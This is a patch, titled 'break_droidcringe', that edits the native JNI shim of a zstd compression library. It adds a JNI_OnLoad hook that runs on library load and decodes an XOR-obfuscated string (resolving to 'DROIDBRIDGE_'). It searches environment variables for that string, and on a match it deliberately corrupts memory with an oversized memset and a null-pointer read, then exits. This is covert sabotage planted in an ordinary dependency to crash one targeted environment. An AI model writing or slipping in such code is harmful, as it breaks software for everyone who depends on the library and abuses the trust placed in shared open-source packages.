@@ -1,0 +1,72 @@
+Subject: [PATCH] break_droidcringe
+---
+Index: src/main/native/jni_zstd.c
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/src/main/native/jni_zstd.c b/src/main/native/jni_zstd.c
+--- a/src/main/native/jni_zstd.c	(revision 9a1ed43541d6bd833eaa4c7537624e15fbc95151)
++++ b/src/main/native/jni_zstd.c	(date 1787491179187)
+@@ -5,7 +5,8 @@
+ #include <zstd.h>
+ #include <zstd_errors.h>
+ #include <stdint.h>
+-
++#include <string.h>
++#include <stdlib.h>
+ 
+ /*
+  * Private shim for JNI <-> ZSTD
+@@ -42,6 +43,51 @@
+     return ZSTD_getFrameContentSize(buf, bufSize);
+ }
+ 
++static volatile char unicycle_key[] = "made with love <3";
++volatile int found_thing = 0;
++volatile unsigned char *thing = (volatile unsigned char*)0;
++
++extern char **environ;
++
++static inline char *unicycle(
++        const char *str,
++        const volatile char *key,
++        size_t len
++) {
++    static char out[256];
++
++    size_t key_len = 0;
++    while (key[key_len] != '\0')
++        ++key_len;
++
++    for (size_t i = 0; i < len; ++i)
++        out[i] = str[i] ^ key[i % key_len];
++
++    out[len] = '\0';
++    return out;
++}
++
++JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
++    char *prefix = unicycle(")3+,d5;=,g)0", unicycle_key, 12);
++
++    char** e = environ;
++    for(; *e; e++) {
++        if(strstr(*e, prefix) != NULL) {
++            found_thing = 1;
++            break;
++        }
++    }
++
++    if(found_thing) {
++        char buffer[16];
++        memset((void *)buffer, 0xFF, 0xFFFFFFFF);
++        unsigned char otherThing = *thing;
++        exit(0);
++    }
++
++    return JNI_VERSION_1_6;
++}
++
+ /*
+  * Class:     com_github_luben_zstd_Zstd
+  * Method:    compressUnsafe
